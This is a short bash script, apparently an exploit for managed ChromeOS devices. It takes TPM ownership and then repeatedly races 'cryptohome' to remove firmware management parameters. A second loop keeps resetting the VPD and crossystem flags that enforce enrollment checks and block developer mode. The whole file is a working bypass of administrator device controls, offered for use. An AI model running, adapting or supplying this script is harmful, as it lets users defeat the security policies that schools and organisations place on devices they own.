#!/bin/bash

# standalone FWMP remove racer

{
    until tpm_manager_client take_ownership; do
        echo "failed to take ownership"
        sleep 0.5
    done

    {
        launch_racer(){
            echo launching racer at "$(date)"
            {
                while true; do
                    cryptohome --action=remove_firmware_management_parameters >/dev/null 2>&1
                done
            } &
            RACERPID=$!
        }
        launch_racer
        while true; do
            echo "checking cryptohome status"
            if [ "$(cryptohome --action=is_mounted)" == "true" ]; then
                if ! [ -z $RACERPID ]; then
                    echo "logged in, waiting to kill racer"
                    sleep 60
                    kill -9 $RACERPID
                    echo "racer terminated at $(date)"
                    RACERPID=
                fi
            else
                if [ -z $RACERPID ]; then 
                    launch_racer
                fi
            fi
            sleep 10
        done
    } &

    {
        while true; do
            vpd -i RW_VPD -s check_enrollment=0 >/dev/null 2>&1
            vpd -i RW_VPD -s block_devmode=0 >/dev/null 2>&1
            crossystem block_devmode=0 >/dev/null 2>&1
            sleep 60
        done
    } &
} &
